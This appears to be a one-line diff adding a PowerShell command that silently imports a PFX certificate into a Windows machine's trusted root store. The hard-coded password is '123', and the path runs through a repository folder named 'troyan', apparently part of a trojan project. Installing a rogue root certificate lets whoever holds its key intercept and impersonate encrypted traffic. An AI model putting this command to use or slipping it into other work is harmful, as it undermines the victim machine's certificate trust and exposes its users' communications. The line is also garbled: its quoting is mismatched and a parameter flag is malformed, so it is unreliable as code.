@@ -1,0 +1,1 @@
+powershell -Command "Import-PfxCertificate "FilePath 'c:\Users\Administrator\Source\Repos\dns\troyan\final.pfx' cert:\localMachine\Root -Password (ConvertTo-SecureString -String '123' -AsPlainText -Force)
